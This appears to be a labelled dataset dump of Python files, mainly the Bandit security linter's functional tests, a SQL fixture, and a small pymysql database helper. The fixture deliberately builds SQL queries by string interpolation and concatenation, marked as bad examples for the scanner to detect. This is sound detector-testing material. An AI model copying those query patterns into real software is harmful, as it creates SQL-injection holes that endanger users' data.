    def test_ssl_insecure_version(self):
        '''Test for insecure SSL protocol versions.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},
            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}
        }
        self.check_example('ssl-insecure-version.py', expect)

    def test_subprocess_shell(self):
        '''Test for `subprocess.Popen` with `shell=True`.'''
        expect = {
            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},
            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}
        }
        self.check_example('subprocess_shell.py', expect)

    def test_urlopen(self):
        '''Test for dangerous URL opening.'''
        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}
        self.check_example('urlopen.py', expect)

    def test_utils_shell(self):
        '''Test for `utils.execute*` with `shell=True`.'''
        expect = {
            'SEVERITY': {'LOW': 5},
            'CONFIDENCE': {'HIGH': 5}
        }
        self.check_example('utils-shell.py', expect)

    def test_wildcard_injection(self):
        '''Test for wildcard injection in shell commands.'''
        expect = {
            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},
            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}
        }
        self.check_example('wildcard-injection.py', expect)

    def test_yaml(self):
        '''Test for `yaml.load`.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('yaml_load.py', expect)

    def test_jinja2_templating(self):
        '''Test jinja templating for potential XSS bugs.'''
        expect = {
            'SEVERITY': {'HIGH': 4},
            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}
        }
        self.check_example('jinja2_templating.py', expect)

    def test_secret_config_option(self):
        '''Test for `secret=True` in Oslo's config.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},
            'CONFIDENCE': {'MEDIUM': 3}
        }
        self.check_example('secret-config-option.py', expect)

    def test_mako_templating(self):
        '''Test Mako templates for XSS.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('mako_templating.py', expect)

    def test_xml(self):
        '''Test xml vulnerabilities.'''
        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_celementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}
        self.check_example('xml_expatbuilder.py', expect)

        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}
        self.check_example('xml_lxml.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_pulldom.py', expect)

        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('xml_xmlrpc.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_elementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}
        self.check_example('xml_expatreader.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_minidom.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}
        self.check_example('xml_sax.py', expect)

    def test_httpoxy(self):
        '''Test httpoxy vulnerability.'''
        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('httpoxy_cgihandler.py', expect)
        self.check_example('httpoxy_twisted_script.py', expect)
        self.check_example('httpoxy_twisted_directory.py', expect)

    def test_asserts(self):
        '''Test catching the use of assert.'''
        expect = {'SEVERITY': {'LOW': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('assert.py', expect)

    def test_paramiko_injection(self):
        '''Test paramiko command execution.'''
        expect = {'SEVERITY': {'MEDIUM': 2},
                  'CONFIDENCE': {'MEDIUM': 2}}
        self.check_example('paramiko_injection.py', expect)

    def test_partial_path(self):
        '''Test process spawning with partial file paths.'''
        expect = {'SEVERITY': {'LOW': 11},
                  'CONFIDENCE': {'HIGH': 11}}

        self.check_example('partial_path_process.py', expect)

    def test_try_except_continue(self):
        '''Test try, except, continue detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                    if x.__name__ == 'try_except_continue'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_continue.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_continue.py', expect)

    def test_try_except_pass(self):
        '''Test try, except pass detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                     if x.__name__ == 'try_except_pass'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_pass.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_pass.py', expect)

    def test_metric_gathering(self):
        expect = {
            'nosec': 2, 'loc': 7,
            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}
        }
        self.check_metrics('skip.py', expect)
        expect = {
            'nosec': 0, 'loc': 4,
            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}
        }
        self.check_metrics('imports.py', expect)

    def test_weak_cryptographic_key(self):
        '''Test for weak key sizes.'''
        expect = {
            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},
            'CONFIDENCE': {'HIGH': 14}
        }
        self.check_example('weak_cryptographic_key_sizes.py', expect)

    def test_multiline_code(self):
        '''Test issues in multiline statements return code as expected.'''
        self.run_example('multiline_statement.py')
        self.assertEqual(0, len(self.b_mgr.skipped))
        self.assertEqual(1, len(self.b_mgr.files_list))
        self.assertTrue(self.b_mgr.files_list[0].endswith(
                        'multiline_statement.py'))

        issues = self.b_mgr.get_issue_list()
        self.assertEqual(2, len(issues))
        self.assertTrue(
            issues[0].fname.endswith('examples/multiline_statement.py')
        )

        self.assertEqual(1, issues[0].lineno)
        self.assertEqual(list(range(1, 3)), issues[0].linerange)
        self.assertIn('subprocess', issues[0].get_code())
        self.assertEqual(5, issues[1].lineno)
        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)
        self.assertIn('shell=True', issues[1].get_code())

    def test_code_line_numbers(self):
        self.run_example('binding.py')
        issues = self.b_mgr.get_issue_list()

        code_lines = issues[0].get_code().splitlines()
        lineno = issues[0].lineno
        self.assertEqual(""%i "" % (lineno - 1), code_lines[0][:2])
        self.assertEqual(""%i "" % (lineno), code_lines[1][:2])
        self.assertEqual(""%i "" % (lineno + 1), code_lines[2][:2])

    def test_flask_debug_true(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'MEDIUM': 1}
        }
        self.check_example('flask_debug.py', expect)

    def test_nosec(self):
        expect = {
            'SEVERITY': {},
            'CONFIDENCE': {}
        }
        self.check_example('nosec.py', expect)

    def test_baseline_filter(self):
        issue_text = ('A Flask app appears to be run with debug=True, which '
                      'exposes the Werkzeug debugger and allows the execution '
                      'of arbitrary code.')
        json = """"""{
          ""results"": [
            {
              ""code"": ""..."",
              ""filename"": ""%s/examples/flask_debug.py"",
              ""issue_confidence"": ""MEDIUM"",
              ""issue_severity"": ""HIGH"",
              ""issue_text"": ""%s"",
              ""line_number"": 10,
              ""line_range"": [
                10
              ],
              ""test_name"": ""flask_debug_true"",
              ""test_id"": ""B201""
            }
          ]
        }
        """""" % (os.getcwd(), issue_text)

        self.b_mgr.populate_baseline(json)
        self.run_example('flask_debug.py')
        self.assertEqual(1, len(self.b_mgr.baseline))
        self.assertEqual({}, self.b_mgr.get_issue_list())

    def test_blacklist_input(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'HIGH': 1}
        }
        self.check_example('input.py', expect)
/n/n/n",0
25,25,6ce60806ca8a44d8a8b37050539e2b2f9a54b847,"/examples/sql_statements.py/n/nimport sqlalchemy

# bad
query = ""SELECT * FROM foo WHERE id = '%s'"" % identifier
query = ""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value
query = ""DELETE FROM foo WHERE id = '%s'"" % identifier
query = ""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier
query = """"""WITH cte AS (SELECT x FROM foo)
SELECT x FROM cte WHERE x = '%s'"""""" % identifier

# bad
cur.execute(""SELECT * FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier)

# good
cur.execute(""SELECT * FROM foo WHERE id = '%s'"", identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"", value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"", identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"", identifier)

# bad
query = ""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + val

# bad
cur.execute(""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + val)


# bug: https://bugs.launchpad.net/bandit/+bug/1479625
def a():
    def b():
        pass
    return b

a()(""SELECT %s FROM foo"" % val)

# real world false positives
choices=[('server_list', _(""Select from active instances""))]
print(""delete from the cache as the first argument"")
/n/n/n/tests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import os

import six
import testtools

from bandit.core import config as b_config
from bandit.core import constants as C
from bandit.core import manager as b_manager
from bandit.core import metrics
from bandit.core import test_set as b_test_set


class FunctionalTests(testtools.TestCase):

    '''Functional tests for bandit test plugins.

    This set of tests runs bandit against each example file in turn
    and records the score returned. This is compared to a known good value.
    When new tests are added to an example the expected result should be
    adjusted to match.
    '''

    def setUp(self):
        super(FunctionalTests, self).setUp()
        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch
        # them up here for the testing environment.
        #
        path = os.path.join(os.getcwd(), 'bandit', 'plugins')
        b_conf = b_config.BanditConfig()
        self.b_mgr = b_manager.BanditManager(b_conf, 'file')
        self.b_mgr.b_conf._settings['plugins_dir'] = path
        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)

    def run_example(self, example_script, ignore_nosec=False):
        '''A helper method to run the specified test

        This method runs the test, which populates the self.b_mgr.scores
        value. Call this directly if you need to run a test, but do not
        need to test the resulting scores against specified values.
        :param example_script: Filename of an example script to test
        '''
        path = os.path.join(os.getcwd(), 'examples', example_script)
        self.b_mgr.ignore_nosec = ignore_nosec
        self.b_mgr.discover_files([path], True)
        self.b_mgr.run_tests()

    def check_example(self, example_script, expect, ignore_nosec=False):
        '''A helper method to test the scores for example scripts.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected counts of issue types
        '''
        # reset scores for subsequent calls to check_example
        self.b_mgr.scores = []
        self.run_example(example_script, ignore_nosec=ignore_nosec)
        expected = 0
        result = 0
        for test_scores in self.b_mgr.scores:
            for score_type in test_scores:
                self.assertIn(score_type, expect)
                for rating in expect[score_type]:
                    expected += (
                        expect[score_type][rating] * C.RANKING_VALUES[rating]
                    )
                result += sum(test_scores[score_type])
        self.assertEqual(expected, result)

    def check_metrics(self, example_script, expect):
        '''A helper method to test the metrics being returned.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected values of metrics
        '''
        self.b_mgr.metrics = metrics.Metrics()
        self.b_mgr.scores = []
        self.run_example(example_script)

        # test general metrics (excludes issue counts)
        m = self.b_mgr.metrics.data
        for k in expect:
            if k != 'issues':
                self.assertEqual(expect[k], m['_totals'][k])
        # test issue counts
        if 'issues' in expect:
            for (criteria, default) in C.CRITERIA:
                for rank in C.RANKING:
                    label = '{0}.{1}'.format(criteria, rank)
                    expected = 0
                    if expect['issues'].get(criteria, None).get(rank, None):
                        expected = expect['issues'][criteria][rank]
                    self.assertEqual(expected, m['_totals'][label])

    def test_binding(self):
        '''Test the bind-to-0.0.0.0 example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}
        self.check_example('binding.py', expect)

    def test_crypto_md5(self):
        '''Test the `hashlib.md5` example.'''
        expect = {'SEVERITY': {'MEDIUM': 11},
                  'CONFIDENCE': {'HIGH': 11}}
        self.check_example('crypto-md5.py', expect)

    def test_ciphers(self):
        '''Test the `Crypto.Cipher` example.'''
        expect = {'SEVERITY': {'HIGH': 13},
                  'CONFIDENCE': {'HIGH': 13}}
        self.check_example('ciphers.py', expect)

    def test_cipher_modes(self):
        '''Test for insecure cipher modes.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('cipher-modes.py', expect)

    def test_eval(self):
        '''Test the `eval` example.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('eval.py', expect)

    def test_mark_safe(self):
        '''Test the `mark_safe` example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('mark_safe.py', expect)

    def test_exec(self):
        '''Test the `exec` example.'''
        filename = 'exec-{}.py'
        if six.PY2:
            filename = filename.format('py2')
            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}
        else:
            filename = filename.format('py3')
            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example(filename, expect)

    def test_exec_as_root(self):
        '''Test for the `run_as_root=True` keyword argument.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}
        self.check_example('exec-as-root.py', expect)

    def test_hardcoded_passwords(self):
        '''Test for hard-coded passwords.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}
        self.check_example('hardcoded-passwords.py', expect)

    def test_hardcoded_tmp(self):
        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('hardcoded-tmp.py', expect)

    def test_httplib_https(self):
        '''Test for `httplib.HTTPSConnection`.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('httplib_https.py', expect)

    def test_imports_aliases(self):
        '''Test the `import X as Y` syntax.'''
        expect = {
            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},
            'CONFIDENCE': {'HIGH': 9}
        }
        self.check_example('imports-aliases.py', expect)

    def test_imports_from(self):
        '''Test the `from X import Y` syntax.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('imports-from.py', expect)

    def test_imports_function(self):
        '''Test the `__import__` function.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports-function.py', expect)

    def test_telnet_usage(self):
        '''Test for `import telnetlib` and Telnet.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('telnetlib.py', expect)

    def test_ftp_usage(self):
        '''Test for `import ftplib` and FTP.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('ftplib.py', expect)

    def test_imports(self):
        '''Test for dangerous imports.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports.py', expect)

    def test_mktemp(self):
        '''Test for `tempfile.mktemp`.'''
        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}
        self.check_example('mktemp.py', expect)

    def test_nonsense(self):
        '''Test that a syntactically invalid module is skipped.'''
        self.run_example('nonsense.py')
        self.assertEqual(1, len(self.b_mgr.skipped))

    def test_okay(self):
        '''Test a vulnerability-free file.'''
        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}
        self.check_example('okay.py', expect)

    def test_os_chmod(self):
        '''Test setting file permissions.'''
        filename = 'os-chmod-{}.py'
        if six.PY2:
            filename = filename.format('py2')
        else:
            filename = filename.format('py3')
        expect = {
            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},
            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}
        }
        self.check_example(filename, expect)

    def test_os_exec(self):
        '''Test for `os.exec*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-exec.py', expect)

    def test_os_popen(self):
        '''Test for `os.popen`.'''
        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 9}}
        self.check_example('os-popen.py', expect)

    def test_os_spawn(self):
        '''Test for `os.spawn*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-spawn.py', expect)

    def test_os_startfile(self):
        '''Test for `os.startfile`.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('os-startfile.py', expect)

    def test_os_system(self):
        '''Test for `os.system`.'''
        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('os_system.py', expect)

    def test_pickle(self):
        '''Test for the `pickle` module.'''
        expect = {
            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},
            'CONFIDENCE': {'HIGH': 8}
        }
        self.check_example('pickle_deserialize.py', expect)

    def test_popen_wrappers(self):
        '''Test the `popen2` and `commands` modules.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('popen_wrappers.py', expect)

    def test_random_module(self):
        '''Test for the `random` module.'''
        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}
        self.check_example('random_module.py', expect)

    def test_requests_ssl_verify_disabled(self):
        '''Test for the `requests` library skipping verification.'''
        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('requests-ssl-verify-disabled.py', expect)

    def test_skip(self):
        '''Test `#nosec` and `#noqa` comments.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}
        self.check_example('skip.py', expect)

    def test_ignore_skip(self):
        '''Test --ignore-nosec flag.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('skip.py', expect, ignore_nosec=True)

    def test_sql_statements(self):
        '''Test for SQL injection through string building.'''
        expect = {
            'SEVERITY': {'MEDIUM': 12},
            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}
        self.check_example('sql_statements.py', expect)

    def test_ssl_insecure_version(self):
        '''Test for insecure SSL protocol versions.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},
            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}
        }
        self.check_example('ssl-insecure-version.py', expect)

    def test_subprocess_shell(self):
        '''Test for `subprocess.Popen` with `shell=True`.'''
        expect = {
            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},
            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}
        }
        self.check_example('subprocess_shell.py', expect)

    def test_urlopen(self):
        '''Test for dangerous URL opening.'''
        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}
        self.check_example('urlopen.py', expect)

    def test_utils_shell(self):
        '''Test for `utils.execute*` with `shell=True`.'''
        expect = {
            'SEVERITY': {'LOW': 5},
            'CONFIDENCE': {'HIGH': 5}
        }
        self.check_example('utils-shell.py', expect)

    def test_wildcard_injection(self):
        '''Test for wildcard injection in shell commands.'''
        expect = {
            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},
            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}
        }
        self.check_example('wildcard-injection.py', expect)

    def test_yaml(self):
        '''Test for `yaml.load`.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('yaml_load.py', expect)

    def test_jinja2_templating(self):
        '''Test jinja templating for potential XSS bugs.'''
        expect = {
            'SEVERITY': {'HIGH': 4},
            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}
        }
        self.check_example('jinja2_templating.py', expect)

    def test_secret_config_option(self):
        '''Test for `secret=True` in Oslo's config.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},
            'CONFIDENCE': {'MEDIUM': 3}
        }
        self.check_example('secret-config-option.py', expect)

    def test_mako_templating(self):
        '''Test Mako templates for XSS.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('mako_templating.py', expect)

    def test_xml(self):
        '''Test xml vulnerabilities.'''
        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_celementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}
        self.check_example('xml_expatbuilder.py', expect)

        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}
        self.check_example('xml_lxml.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_pulldom.py', expect)

        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('xml_xmlrpc.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_elementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}
        self.check_example('xml_expatreader.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_minidom.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}
        self.check_example('xml_sax.py', expect)

    def test_httpoxy(self):
        '''Test httpoxy vulnerability.'''
        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('httpoxy_cgihandler.py', expect)
        self.check_example('httpoxy_twisted_script.py', expect)
        self.check_example('httpoxy_twisted_directory.py', expect)

    def test_asserts(self):
        '''Test catching the use of assert.'''
        expect = {'SEVERITY': {'LOW': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('assert.py', expect)

    def test_paramiko_injection(self):
        '''Test paramiko command execution.'''
        expect = {'SEVERITY': {'MEDIUM': 2},
                  'CONFIDENCE': {'MEDIUM': 2}}
        self.check_example('paramiko_injection.py', expect)

    def test_partial_path(self):
        '''Test process spawning with partial file paths.'''
        expect = {'SEVERITY': {'LOW': 11},
                  'CONFIDENCE': {'HIGH': 11}}

        self.check_example('partial_path_process.py', expect)

    def test_try_except_continue(self):
        '''Test try, except, continue detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                    if x.__name__ == 'try_except_continue'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_continue.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_continue.py', expect)

    def test_try_except_pass(self):
        '''Test try, except pass detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                     if x.__name__ == 'try_except_pass'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_pass.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_pass.py', expect)

    def test_metric_gathering(self):
        expect = {
            'nosec': 2, 'loc': 7,
            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}
        }
        self.check_metrics('skip.py', expect)
        expect = {
            'nosec': 0, 'loc': 4,
            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}
        }
        self.check_metrics('imports.py', expect)

    def test_weak_cryptographic_key(self):
        '''Test for weak key sizes.'''
        expect = {
            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},
            'CONFIDENCE': {'HIGH': 14}
        }
        self.check_example('weak_cryptographic_key_sizes.py', expect)

    def test_multiline_code(self):
        '''Test issues in multiline statements return code as expected.'''
        self.run_example('multiline_statement.py')
        self.assertEqual(0, len(self.b_mgr.skipped))
        self.assertEqual(1, len(self.b_mgr.files_list))
        self.assertTrue(self.b_mgr.files_list[0].endswith(
                        'multiline_statement.py'))

        issues = self.b_mgr.get_issue_list()
        self.assertEqual(2, len(issues))
        self.assertTrue(
            issues[0].fname.endswith('examples/multiline_statement.py')
        )

        self.assertEqual(1, issues[0].lineno)
        self.assertEqual(list(range(1, 3)), issues[0].linerange)
        self.assertIn('subprocess', issues[0].get_code())
        self.assertEqual(5, issues[1].lineno)
        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)
        self.assertIn('shell=True', issues[1].get_code())

    def test_code_line_numbers(self):
        self.run_example('binding.py')
        issues = self.b_mgr.get_issue_list()

        code_lines = issues[0].get_code().splitlines()
        lineno = issues[0].lineno
        self.assertEqual(""%i "" % (lineno - 1), code_lines[0][:2])
        self.assertEqual(""%i "" % (lineno), code_lines[1][:2])
        self.assertEqual(""%i "" % (lineno + 1), code_lines[2][:2])

    def test_flask_debug_true(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'MEDIUM': 1}
        }
        self.check_example('flask_debug.py', expect)

    def test_nosec(self):
        expect = {
            'SEVERITY': {},
            'CONFIDENCE': {}
        }
        self.check_example('nosec.py', expect)

    def test_baseline_filter(self):
        issue_text = ('A Flask app appears to be run with debug=True, which '
                      'exposes the Werkzeug debugger and allows the execution '
                      'of arbitrary code.')
        json = """"""{
          ""results"": [
            {
              ""code"": ""..."",
              ""filename"": ""%s/examples/flask_debug.py"",
              ""issue_confidence"": ""MEDIUM"",
              ""issue_severity"": ""HIGH"",
              ""issue_text"": ""%s"",
              ""line_number"": 10,
              ""line_range"": [
                10
              ],
              ""test_name"": ""flask_debug_true"",
              ""test_id"": ""B201""
            }
          ]
        }
        """""" % (os.getcwd(), issue_text)

        self.b_mgr.populate_baseline(json)
        self.run_example('flask_debug.py')
        self.assertEqual(1, len(self.b_mgr.baseline))
        self.assertEqual({}, self.b_mgr.get_issue_list())

    def test_blacklist_input(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'HIGH': 1}
        }
        self.check_example('input.py', expect)
/n/n/n",1
132,132,209b23bad13594c9cdf18d8788fcba7c8f68d37b,"dbhelper.py/n/n
import pymysql
import dbconfig

class DBhelper:
    def connect(self,database=""crimemap""):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection=self.connect()

        try:
            query=""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
            return cursor.fetchall()
        finally:
            connection.close()



    def add_input(self,data):
        connection = self.connect()

        try:
            query = ""INSERT INTO crimes (description) VALUES (%s);""
            with connection.cursor() as cursor:
                cursor.execute(query,data)
                connection.commit()
        finally:
            connection.close()



    def clear_input(self):
        connection = self.connect()

        try:
            query =""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()

/n/n/n",0
133,133,209b23bad13594c9cdf18d8788fcba7c8f68d37b,"/dbhelper.py/n/n
import pymysql
import dbconfig

class DBhelper:
    def connect(self,database=""crimemap""):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
